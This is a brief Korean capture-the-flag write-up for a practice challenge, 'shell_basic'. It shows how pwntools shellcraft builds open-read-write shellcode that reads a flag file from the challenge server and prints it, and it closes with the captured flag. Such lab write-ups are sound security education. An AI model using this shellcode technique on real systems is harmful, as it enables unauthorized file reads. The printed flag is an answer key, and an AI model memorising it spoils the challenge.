# shell_basic 
## 날짜
2026-09-17

# 취약점 분석
## 유형
Shellcode Execution (ORW)

주어진 바이너리는 유저로부터 셸코드를 입력받은 후 실행하는 구조이다. 파일 경로를 직접 엵고 읽고 출력하는 ORW(Open, Read, Write) 셸코드를 작성해야 한다.

## 공격
pwntools의 ```shellcraft```모듈로 어셈블리를 직접 작성하지 않고 ORW 셸코드를 생성했다.

Open: 서버에 숨겨진 플래그 파일 ```/home/shell_basic/flag_name_is_loooooong```을 연다.
```python
shellcode=shellcraft.open("/home/shell_basic/flag_name_is_loooooong", 0, 0)
```

Read: 플래그 파일의(rax) 내용을 0x30바이트만큼 스택(rsp)로 읽어온다.
```python
shellcode+=shellcraft.read('rax', 'rsp', 0x30)
```

Write: 스택에 담긴 내용을 화면에 출력한다. 
```python
shellcode+=shellcraft.write(1, 'rsp', 0x30)
```

## 플래그
DH{ca562d7cf1db6c55cb11c4ec350a3c0b}